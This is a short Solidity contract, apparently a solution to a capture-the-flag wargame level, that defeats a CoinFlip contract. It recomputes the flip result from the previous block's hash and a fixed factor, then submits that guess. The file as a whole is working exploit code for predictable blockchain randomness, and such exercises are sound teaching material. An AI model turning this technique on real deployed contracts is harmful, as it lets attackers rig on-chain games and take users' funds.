// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Level03.sol";

contract Attack {
    CoinFlip instance;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _instance) {
        instance = _instance;
    }

    function flipAttack() public returns (bool success) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        success = instance.flip((blockValue / FACTOR) == 1 ? true : false);
    }
}
